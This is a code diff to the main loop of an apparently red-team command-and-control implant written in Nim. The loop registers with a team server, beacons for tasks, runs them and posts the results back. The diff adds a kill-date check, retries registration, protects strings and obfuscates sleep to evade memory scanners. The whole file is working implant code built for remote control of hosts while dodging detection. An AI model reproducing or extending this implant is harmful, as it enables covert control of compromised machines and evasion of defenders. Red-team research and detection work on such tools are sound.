@@ -1,56 +1,69 @@
-import strformat, os, times, system, base64
-
-import core/[http, context, sleepmask]
+import times, system, random, strformat
+import core/[http, context, sleepmask, exit]
+import utils/io
 import protocol/[task, result, heartbeat, registration]
 import ../common/[types, utils, crypto]
 
 proc main() = 
+    randomize()
 
     # Initialize agent context
     var ctx = AgentCtx.init()
     if ctx == nil: 
         quit(0)
 
-    # Create registration payload
-    var registration: AgentRegistrationData = ctx.collectAgentMetadata()
-    let registrationBytes = ctx.serializeRegistrationData(registration)
-
-    if not ctx.httpPost(registrationBytes): 
-        echo "[-] Agent registration failed."
-        quit(0)
-    echo fmt"[+] [{ctx.agentId}] Agent registered."
-
     #[
         Agent routine: 
-        1. Sleep Obfuscation
-        2. Retrieve task from /tasks endpoint
-        3. Execute task and post result to /results
-        4. If additional tasks have been fetched, go to 2.
-        5. If no more tasks need to be executed, go to 1. 
+        1. Sleep obfuscation
+        2. Check kill date
+        3. Register to the team server if not already connected
+        4. Retrieve tasks via checkin request to a GET endpoint
+        5. Execute task and post result
+        6. If additional tasks have been fetched, go to 3.
+        7. If no more tasks need to be executed, go to 1. 
     ]#
     while true: 
-        # Sleep obfuscation to evade memory scanners
-        sleepObfuscate(ctx.sleep * 1000, ctx.sleepTechnique, ctx.spoofStack)
-
-        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
-        echo "\n", fmt"[*] [{date}] Checking in."
-
         try: 
+            # Sleep obfuscation to evade memory scanners
+            sleepObfuscate(ctx.sleepSettings)
+
+            # Check kill date and exit the agent process if it is reached
+            if ctx.killDate != 0 and now().toTime().toUnix().int64 >= ctx.killDate: 
+                print "[*] Reached kill date: ", ctx.killDate.fromUnix().utc().format("dd-MM-yyyy HH:mm:ss"), " (UTC)."
+                print "[*] Exiting."
+                exit()
+            
+            # Register
+            if not ctx.registered: 
+                # Create registration payload   
+                var registration: Registration = ctx.collectAgentMetadata()
+                let registrationBytes = ctx.serializeRegistrationData(registration)
+
+                if ctx.httpPost(registrationBytes): 
+                    print fmt"[+] [{ctx.agentId}] Agent registered."
+                    ctx.registered = true
+                else: 
+                    print "[-] Agent registration failed."
+                    continue
+
+            let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
+            print "\n", fmt"[*] [{date}] Checking in."
+
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
-            # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
+            # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
             var heartbeat: Heartbeat = ctx.createHeartbeat()
             let 
                 heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
                 packet: string = ctx.httpGet(heartbeatBytes)
 
             if packet.len <= 0: 
-                echo "[*] No tasks to execute."
+                print "[*] No tasks to execute."
                 continue
 
             let tasks: seq[Task] = ctx.deserializePacket(packet)
             
             if tasks.len <= 0: 
-                echo "[*] No tasks to execute."
+                print "[*] No tasks to execute."
                 continue
 
             # Execute all retrieved tasks and return their output to the server
@@ -61,7 +74,7 @@ proc main() =
                 ctx.httpPost(resultBytes)
 
         except CatchableError as err: 
-            echo "[-] ", err.msg
+            print "[-] ", err.msg
 
 when isMainModule:
     main() 
